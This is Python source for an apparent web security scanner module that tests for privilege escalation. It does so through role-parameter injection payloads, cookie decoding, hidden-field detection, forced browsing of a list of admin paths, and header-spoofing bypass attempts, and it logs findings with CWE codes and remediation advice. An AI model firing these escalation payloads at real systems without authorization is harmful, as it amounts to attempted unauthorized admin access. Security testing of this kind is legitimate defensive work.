"""
Privilege Escalation via Parameter Manipulation Tester
Key-value injection, cookie manipulation, hidden fields, response manipulation, forced browsing, header bypass.
"""

import json
import base64
from urllib.parse import urljoin
from colorama import Fore, Style


class PrivilegeEscalationTester:
    def __init__(self, session, base_url):
        self.session = session
        self.base_url = base_url
        self.findings = []

    def run_all_checks(self, is_authenticated=False):
        print(f"{Fore.CYAN}[*] Privilege Escalation Testing{Style.RESET_ALL}")
        self.test_role_parameter_injection()
        self.test_cookie_manipulation()
        self.test_hidden_field_manipulation()
        self.test_forced_browsing()
        self.test_header_auth_bypass()
        self.test_response_body_indicators()
        return self.findings

    def test_role_parameter_injection(self):
        print(f"{Fore.YELLOW}[*] Testing role parameter injection...{Style.RESET_ALL}")
        priv_params = [
            {'role': 'admin'}, {'isAdmin': True}, {'is_admin': True},
            {'privilege': 'superuser'}, {'access_level': 999},
            {'user_type': 'administrator'}, {'permissions': 'all'},
            {'group': 'admin'}, {'admin': '1'}, {'staff': True},
        ]
        endpoints = ['/api/profile', '/api/me', '/api/user/update',
                     '/api/settings', '/profile', '/settings']
        for ep in endpoints:
            url = urljoin(self.base_url, ep)
            for params in priv_params:
                try:
                    r = self.session.put(url, json=params, timeout=5)
                    if r.status_code in (200, 201):
                        # Check if role was actually changed
                        try:
                            resp_data = r.json()
                            key = list(params.keys())[0]
                            if key in str(resp_data) and str(params[key]) in str(resp_data):
                                self.findings.append({
                                    'title': f'Privilege Escalation via {key}',
                                    'description': f'Parameter {key}={params[key]} accepted at {ep}',
                                    'severity': 'CRITICAL', 'category': 'privilege_escalation',
                                    'owasp': 'A01:2021', 'cwe': 'CWE-269',
                                    'remediation': 'Ignore role/privilege parameters in user-editable requests',
                                    'evidence': f'PUT {ep} with {params} reflected in response',
                                    'mitre_attack': 'T1548'
                                })
                                return
                        except Exception:
                            pass
                except Exception:
                    continue

    def test_cookie_manipulation(self):
        print(f"{Fore.YELLOW}[*] Testing cookie value manipulation...{Style.RESET_ALL}")
        for cookie in self.session.cookies:
            original = cookie.value
            # Try base64 decode
            try:
                decoded = base64.b64decode(original + '==').decode('utf-8', errors='ignore')
                if any(k in decoded.lower() for k in ['user', 'role', 'admin', 'id', 'level']):
                    # Try modifying the decoded value
                    if 'role' in decoded.lower():
                        modified = decoded.replace('user', 'admin').replace('User', 'Admin')
                    elif 'admin' in decoded.lower():
                        modified = decoded.replace('false', 'true').replace('0', '1')
                    else:
                        modified = decoded
                    if modified != decoded:
                        self.findings.append({
                            'title': f'Cookie Privilege Escalation Risk: {cookie.name}',
                            'description': f'Cookie "{cookie.name}" contains role/privilege data in base64',
                            'severity': 'HIGH', 'category': 'privilege_escalation',
                            'cwe': 'CWE-565',
                            'remediation': 'Never store role/privilege in client-side cookies. Use server-side sessions.',
                            'evidence': f'Cookie decoded: {decoded[:100]}',
                            'mitre_attack': 'T1539'
                        })
                        return
            except Exception:
                pass
            # Try JSON cookie modification
            try:
                data = json.loads(original)
                if isinstance(data, dict):
                    priv_keys = [k for k in data if k.lower() in ('role', 'admin', 'is_admin', 'privilege', 'level')]
                    if priv_keys:
                        self.findings.append({
                            'title': f'Cookie Contains Privilege Data: {cookie.name}',
                            'description': f'JSON cookie has role/privilege fields: {priv_keys}',
                            'severity': 'HIGH', 'category': 'privilege_escalation',
                            'cwe': 'CWE-565',
                            'remediation': 'Store session state server-side, not in cookies',
                            'evidence': f'Cookie JSON keys: {priv_keys}'
                        })
                        return
            except Exception:
                pass

    def test_hidden_field_manipulation(self):
        print(f"{Fore.YELLOW}[*] Testing hidden field manipulation...{Style.RESET_ALL}")
        pages = ['/profile', '/settings', '/account', '/register']
        import re
        for page in pages:
            try:
                r = self.session.get(urljoin(self.base_url, page), timeout=5)
                if r.status_code != 200:
                    continue
                hidden_fields = re.findall(
                    r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
                    r.text, re.IGNORECASE
                )
                priv_fields = [(n, v) for n, v in hidden_fields
                               if any(k in n.lower() for k in ['role', 'admin', 'privilege', 'level', 'type', 'group'])]
                if priv_fields:
                    self.findings.append({
                        'title': 'Hidden Form Fields with Privilege Data',
                        'description': f'Hidden fields at {page}: {[(n, v) for n, v in priv_fields]}',
                        'severity': 'MEDIUM', 'category': 'privilege_escalation',
                        'cwe': 'CWE-472',
                        'remediation': 'Never use hidden fields for authorization. Validate roles server-side.',
                        'evidence': f'Fields: {priv_fields}'
                    })
                    return
            except Exception:
                continue

    def test_forced_browsing(self):
        print(f"{Fore.YELLOW}[*] Testing forced browsing...{Style.RESET_ALL}")
        admin_paths = [
            '/admin', '/admin/', '/administrator', '/admin/dashboard',
            '/admin/users', '/admin/settings', '/admin/config',
            '/api/admin', '/api/admin/users', '/api/system',
            '/management', '/console', '/panel', '/cpanel',
            '/phpmyadmin', '/adminer', '/debug', '/internal',
        ]
        for path in admin_paths:
            try:
                r = self.session.get(urljoin(self.base_url, path), timeout=5)
                if r.status_code == 200 and len(r.text) > 100:
                    if 'login' not in r.url.lower() and 'signin' not in r.url.lower():
                        self.findings.append({
                            'title': f'Forced Browsing: {path}',
                            'description': f'Admin/restricted endpoint {path} accessible',
                            'severity': 'HIGH', 'category': 'privilege_escalation',
                            'owasp': 'A01:2021', 'cwe': 'CWE-425',
                            'remediation': 'Implement proper access control on all admin endpoints',
                            'evidence': f'GET {path} returned 200 ({len(r.text)} bytes)'
                        })
                        return
            except Exception:
                continue

    def test_header_auth_bypass(self):
        print(f"{Fore.YELLOW}[*] Testing header-based privilege escalation...{Style.RESET_ALL}")
        headers_list = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-Host': 'admin.internal'},
        ]
        for headers in headers_list:
            try:
                r = self.session.get(urljoin(self.base_url, '/admin'), headers=headers, timeout=5)
                if r.status_code == 200 and 'admin' in r.text.lower():
                    key = list(headers.keys())[0]
                    self.findings.append({
                        'title': f'Privilege Escalation via {key}',
                        'description': f'Admin access granted with header {key}: {headers[key]}',
                        'severity': 'CRITICAL', 'category': 'privilege_escalation',
                        'cwe': 'CWE-290',
                        'remediation': f'Do not use {key} for authorization decisions',
                        'evidence': f'{key}: {headers[key]} -> admin access'
                    })
                    return
            except Exception:
                continue

    def test_response_body_indicators(self):
        print(f"{Fore.YELLOW}[*] Checking response for privilege indicators...{Style.RESET_ALL}")
        try:
            r = self.session.get(urljoin(self.base_url, '/api/me'), timeout=5)
            if r.status_code == 200:
                try:
                    data = r.json()
                    flat = json.dumps(data).lower()
                    indicators = ['is_admin', 'isadmin', 'role', 'privilege', 'access_level',
                                  'permissions', 'admin', 'superuser', 'moderator']
                    found = [i for i in indicators if i in flat]
                    if found:
                        self.findings.append({
                            'title': 'Privilege Indicators in API Response',
                            'description': f'API response contains role/privilege fields: {found}',
                            'severity': 'INFO', 'category': 'privilege_escalation',
                            'remediation': 'Ensure privilege fields cannot be modified by user requests',
                            'evidence': f'Fields found: {found}'
                        })
                except Exception:
                    pass
        except Exception:
            pass
